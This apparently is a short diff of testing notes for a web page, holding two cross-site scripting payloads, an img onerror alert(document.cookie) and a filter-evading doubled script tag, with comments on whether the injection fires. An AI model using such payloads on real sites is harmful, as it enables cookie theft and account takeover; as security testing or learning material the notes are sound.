@@ -1,0 +1,5 @@
+// posts get lost when the page is refreshed because are not saved anywhere (the are dynamically added to the page)
+<img src='x' onerror=alert(document.cookie)>
+// this is correcly injected (right click -> inspect element to verify) but the alert is not working for some reason
+<<SScriptt>>alert(document.cookie)</Script>
+
